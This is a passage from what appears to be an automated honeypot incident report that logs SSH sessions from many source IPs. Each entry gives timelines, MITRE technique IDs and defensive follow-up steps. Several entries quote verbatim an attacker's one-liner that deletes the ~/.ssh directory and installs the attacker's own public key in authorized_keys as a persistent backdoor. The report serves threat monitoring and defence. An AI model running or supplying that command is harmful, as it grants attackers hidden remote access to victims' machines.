| `2026-07-02 09:24:24` | `cowrie.session.file_download` |
| `2026-07-02 09:24:24` | `cowrie.log.closed` |
| `2026-07-02 09:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `144.48.6[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2413a23eb4ae

| Field | Detail |
|---|---|
| **Source IP** | `144.48.6[.]26` |
| **First Seen** | 2026-07-02 09:24 |
| **Last Seen** | 2026-07-02 09:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:24:24` | `cowrie.session.connect` |
| `2026-07-02 09:24:24` | `cowrie.client.version` |
| `2026-07-02 09:24:24` | `cowrie.client.kex` |
| `2026-07-02 09:24:26` | `cowrie.login.success` |
| `2026-07-02 09:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `144.48.6[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6717ef97fba9

| Field | Detail |
|---|---|
| **Source IP** | `144.48.6[.]26` |
| **First Seen** | 2026-07-02 09:24 |
| **Last Seen** | 2026-07-02 09:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:24:26` | `cowrie.session.connect` |
| `2026-07-02 09:24:26` | `cowrie.client.version` |
| `2026-07-02 09:24:27` | `cowrie.client.kex` |
| `2026-07-02 09:24:28` | `cowrie.login.success` |
| `2026-07-02 09:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `144.48.6[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d23b7c2b515

| Field | Detail |
|---|---|
| **Source IP** | `103.82.21[.]8` |
| **First Seen** | 2026-07-02 09:24 |
| **Last Seen** | 2026-07-02 09:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:24:36` | `cowrie.session.connect` |
| `2026-07-02 09:24:36` | `cowrie.client.version` |
| `2026-07-02 09:24:37` | `cowrie.client.kex` |
| `2026-07-02 09:24:38` | `cowrie.login.success` |
| `2026-07-02 09:24:39` | `cowrie.session.params` |
| `2026-07-02 09:24:39` | `cowrie.command.input` |
| `2026-07-02 09:24:39` | `cowrie.command.failed` |
| `2026-07-02 09:24:40` | `cowrie.log.closed` |
| `2026-07-02 09:24:41` | `cowrie.session.params` |
| `2026-07-02 09:24:41` | `cowrie.command.input` |
| `2026-07-02 09:24:41` | `cowrie.session.file_download` |
| `2026-07-02 09:24:41` | `cowrie.log.closed` |
| `2026-07-02 09:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.21[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.82.21[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9374942445f

| Field | Detail |
|---|---|
| **Source IP** | `103.82.21[.]8` |
| **First Seen** | 2026-07-02 09:24 |
| **Last Seen** | 2026-07-02 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:24:41` | `cowrie.session.connect` |
| `2026-07-02 09:24:41` | `cowrie.client.version` |
| `2026-07-02 09:24:41` | `cowrie.client.kex` |
| `2026-07-02 09:24:43` | `cowrie.login.success` |
| `2026-07-02 09:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.21[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.82.21[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804eff6ea8ce

| Field | Detail |
|---|---|
| **Source IP** | `103.82.21[.]8` |
| **First Seen** | 2026-07-02 09:24 |
| **Last Seen** | 2026-07-02 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:24:43` | `cowrie.session.connect` |
| `2026-07-02 09:24:43` | `cowrie.client.version` |
| `2026-07-02 09:24:43` | `cowrie.client.kex` |
| `2026-07-02 09:24:45` | `cowrie.login.success` |
| `2026-07-02 09:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.21[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.82.21[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee953c43720

| Field | Detail |
|---|---|
| **Source IP** | `61.240.17[.]66` |
| **First Seen** | 2026-07-02 09:25 |
| **Last Seen** | 2026-07-02 09:30 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:25:01` | `cowrie.session.connect` |
| `2026-07-02 09:25:01` | `cowrie.client.version` |
| `2026-07-02 09:25:01` | `cowrie.client.kex` |
| `2026-07-02 09:25:02` | `cowrie.login.success` |
| `2026-07-02 09:30:02` | `cowrie.session.file_upload` |
| `2026-07-02 09:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.240.17[.]66` to AbuseIPDB if not already reported
- [ ] Block `61.240.17[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c65a16b786d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 09:25 |
| **Last Seen** | 2026-07-02 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:25:24` | `cowrie.session.connect` |
| `2026-07-02 09:25:24` | `cowrie.client.version` |
| `2026-07-02 09:25:24` | `cowrie.client.kex` |
| `2026-07-02 09:25:25` | `cowrie.login.success` |
| `2026-07-02 09:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda7e731f21c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 09:25 |
| **Last Seen** | 2026-07-02 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:25:25` | `cowrie.session.connect` |
| `2026-07-02 09:25:25` | `cowrie.client.version` |
| `2026-07-02 09:25:25` | `cowrie.client.kex` |
| `2026-07-02 09:25:26` | `cowrie.login.success` |
| `2026-07-02 09:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc5b07fd2e22

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 09:25 |
| **Last Seen** | 2026-07-02 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:25:29` | `cowrie.session.connect` |
| `2026-07-02 09:25:29` | `cowrie.client.version` |
| `2026-07-02 09:25:30` | `cowrie.client.kex` |
| `2026-07-02 09:25:30` | `cowrie.login.success` |
| `2026-07-02 09:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad856e2bfd7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 09:25 |
| **Last Seen** | 2026-07-02 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:25:30` | `cowrie.session.connect` |
| `2026-07-02 09:25:30` | `cowrie.client.version` |
| `2026-07-02 09:25:30` | `cowrie.client.kex` |
| `2026-07-02 09:25:31` | `cowrie.login.success` |
| `2026-07-02 09:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e5b65fef8f3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 09:25 |
| **Last Seen** | 2026-07-02 09:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:25:42` | `cowrie.session.connect` |
| `2026-07-02 09:25:42` | `cowrie.client.version` |
| `2026-07-02 09:25:42` | `cowrie.client.kex` |
| `2026-07-02 09:25:42` | `cowrie.login.success` |
| `2026-07-02 09:25:43` | `cowrie.session.params` |
| `2026-07-02 09:25:43` | `cowrie.command.input` |
| `2026-07-02 09:25:43` | `cowrie.log.closed` |
| `2026-07-02 09:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-739f5b2a4213

| Field | Detail |
|---|---|
| **Source IP** | `165.227.93[.]100` |
| **First Seen** | 2026-07-02 09:26 |
| **Last Seen** | 2026-07-02 09:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:26:12` | `cowrie.session.connect` |
| `2026-07-02 09:26:12` | `cowrie.client.version` |
| `2026-07-02 09:26:12` | `cowrie.client.kex` |
| `2026-07-02 09:26:12` | `cowrie.login.success` |
| `2026-07-02 09:26:13` | `cowrie.session.params` |
| `2026-07-02 09:26:13` | `cowrie.command.input` |
| `2026-07-02 09:26:13` | `cowrie.command.failed` |
| `2026-07-02 09:26:13` | `cowrie.log.closed` |
| `2026-07-02 09:26:14` | `cowrie.session.params` |
| `2026-07-02 09:26:14` | `cowrie.command.input` |
| `2026-07-02 09:26:14` | `cowrie.session.file_download` |
| `2026-07-02 09:26:14` | `cowrie.log.closed` |
| `2026-07-02 09:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.93[.]100` to AbuseIPDB if not already reported
- [ ] Block `165.227.93[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-079dab736f08

| Field | Detail |
|---|---|
| **Source IP** | `165.227.93[.]100` |
| **First Seen** | 2026-07-02 09:26 |
| **Last Seen** | 2026-07-02 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:26:14` | `cowrie.session.connect` |
| `2026-07-02 09:26:14` | `cowrie.client.version` |
| `2026-07-02 09:26:14` | `cowrie.client.kex` |
| `2026-07-02 09:26:14` | `cowrie.login.success` |
| `2026-07-02 09:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.93[.]100` to AbuseIPDB if not already reported
- [ ] Block `165.227.93[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba83773559d

| Field | Detail |
|---|---|
| **Source IP** | `165.227.93[.]100` |
| **First Seen** | 2026-07-02 09:26 |
| **Last Seen** | 2026-07-02 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:26:14` | `cowrie.session.connect` |
| `2026-07-02 09:26:14` | `cowrie.client.version` |
| `2026-07-02 09:26:14` | `cowrie.client.kex` |
| `2026-07-02 09:26:14` | `cowrie.login.success` |
| `2026-07-02 09:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.93[.]100` to AbuseIPDB if not already reported
- [ ] Block `165.227.93[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1801bd6a8e2e

| Field | Detail |
|---|---|
| **Source IP** | `104.236.99[.]179` |
| **First Seen** | 2026-07-02 09:28 |
| **Last Seen** | 2026-07-02 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:28:18` | `cowrie.session.connect` |
| `2026-07-02 09:28:18` | `cowrie.client.version` |
| `2026-07-02 09:28:18` | `cowrie.client.kex` |
| `2026-07-02 09:28:18` | `cowrie.login.success` |
| `2026-07-02 09:28:19` | `cowrie.session.params` |
| `2026-07-02 09:28:19` | `cowrie.command.input` |
| `2026-07-02 09:28:19` | `cowrie.command.failed` |
| `2026-07-02 09:28:19` | `cowrie.log.closed` |
| `2026-07-02 09:28:20` | `cowrie.session.params` |
| `2026-07-02 09:28:20` | `cowrie.command.input` |
| `2026-07-02 09:28:20` | `cowrie.session.file_download` |
| `2026-07-02 09:28:20` | `cowrie.log.closed` |
| `2026-07-02 09:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.236.99[.]179` to AbuseIPDB if not already reported
- [ ] Block `104.236.99[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fabdcbcabc5d

| Field | Detail |
|---|---|
| **Source IP** | `104.236.99[.]179` |
| **First Seen** | 2026-07-02 09:28 |
| **Last Seen** | 2026-07-02 09:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:28:20` | `cowrie.session.connect` |
| `2026-07-02 09:28:20` | `cowrie.client.version` |
| `2026-07-02 09:28:20` | `cowrie.client.kex` |
| `2026-07-02 09:28:20` | `cowrie.login.success` |
| `2026-07-02 09:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.236.99[.]179` to AbuseIPDB if not already reported
- [ ] Block `104.236.99[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-546e407c81d4

| Field | Detail |
|---|---|
| **Source IP** | `104.236.99[.]179` |
| **First Seen** | 2026-07-02 09:28 |
| **Last Seen** | 2026-07-02 09:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:28:20` | `cowrie.session.connect` |
| `2026-07-02 09:28:20` | `cowrie.client.version` |
| `2026-07-02 09:28:20` | `cowrie.client.kex` |
| `2026-07-02 09:28:20` | `cowrie.login.success` |
| `2026-07-02 09:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.236.99[.]179` to AbuseIPDB if not already reported
- [ ] Block `104.236.99[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e37378d52d

| Field | Detail |
|---|---|
| **Source IP** | `106.12.69[.]68` |
| **First Seen** | 2026-07-02 09:29 |
| **Last Seen** | 2026-07-02 09:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:29:03` | `cowrie.session.connect` |
| `2026-07-02 09:29:04` | `cowrie.client.version` |
| `2026-07-02 09:29:04` | `cowrie.client.kex` |
| `2026-07-02 09:29:05` | `cowrie.login.success` |
| `2026-07-02 09:29:06` | `cowrie.session.params` |
| `2026-07-02 09:29:06` | `cowrie.command.input` |
| `2026-07-02 09:29:06` | `cowrie.command.failed` |
| `2026-07-02 09:29:07` | `cowrie.log.closed` |
| `2026-07-02 09:29:08` | `cowrie.session.params` |
| `2026-07-02 09:29:08` | `cowrie.command.input` |
| `2026-07-02 09:29:08` | `cowrie.session.file_download` |
| `2026-07-02 09:29:08` | `cowrie.log.closed` |
| `2026-07-02 09:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.69[.]68` to AbuseIPDB if not already reported
- [ ] Block `106.12.69[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed7662cf5742

| Field | Detail |
|---|---|
| **Source IP** | `106.12.69[.]68` |
| **First Seen** | 2026-07-02 09:29 |
| **Last Seen** | 2026-07-02 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:29:08` | `cowrie.session.connect` |
| `2026-07-02 09:29:08` | `cowrie.client.version` |
| `2026-07-02 09:29:08` | `cowrie.client.kex` |
| `2026-07-02 09:29:09` | `cowrie.login.success` |
| `2026-07-02 09:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.69[.]68` to AbuseIPDB if not already reported
- [ ] Block `106.12.69[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91a66a458c2

| Field | Detail |
|---|---|
| **Source IP** | `106.12.69[.]68` |
| **First Seen** | 2026-07-02 09:29 |
| **Last Seen** | 2026-07-02 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:29:10` | `cowrie.session.connect` |
| `2026-07-02 09:29:10` | `cowrie.client.version` |
| `2026-07-02 09:29:10` | `cowrie.client.kex` |
| `2026-07-02 09:29:13` | `cowrie.login.success` |
| `2026-07-02 09:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.69[.]68` to AbuseIPDB if not already reported
- [ ] Block `106.12.69[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70de76860118

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 09:30 |
| **Last Seen** | 2026-07-02 09:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:30:47` | `cowrie.session.connect` |
| `2026-07-02 09:30:49` | `cowrie.client.version` |
| `2026-07-02 09:30:49` | `cowrie.client.kex` |
| `2026-07-02 09:30:55` | `cowrie.login.success` |
| `2026-07-02 09:30:58` | `cowrie.session.params` |
| `2026-07-02 09:30:58` | `cowrie.command.input` |
| `2026-07-02 09:31:01` | `cowrie.log.closed` |
| `2026-07-02 09:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d7fc326184

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 09:33 |
| **Last Seen** | 2026-07-02 09:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:33:49` | `cowrie.session.connect` |
| `2026-07-02 09:33:49` | `cowrie.client.version` |
| `2026-07-02 09:33:49` | `cowrie.client.kex` |
| `2026-07-02 09:33:49` | `cowrie.login.success` |
| `2026-07-02 09:33:51` | `cowrie.session.params` |
| `2026-07-02 09:33:51` | `cowrie.command.input` |
| `2026-07-02 09:33:51` | `cowrie.log.closed` |
| `2026-07-02 09:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0315c57b2f22

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 09:37 |
| **Last Seen** | 2026-07-02 09:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:37:30` | `cowrie.session.connect` |
| `2026-07-02 09:37:31` | `cowrie.client.version` |
| `2026-07-02 09:37:31` | `cowrie.client.kex` |
| `2026-07-02 09:37:33` | `cowrie.login.success` |
| `2026-07-02 09:37:34` | `cowrie.session.params` |
| `2026-07-02 09:37:34` | `cowrie.command.input` |
| `2026-07-02 09:37:35` | `cowrie.log.closed` |
| `2026-07-02 09:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4be20dc8f82d

| Field | Detail |
|---|---|
| **Source IP** | `34.79.0[.]187` |
| **First Seen** | 2026-07-02 09:41 |
| **Last Seen** | 2026-07-02 09:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:41:01` | `cowrie.session.connect` |
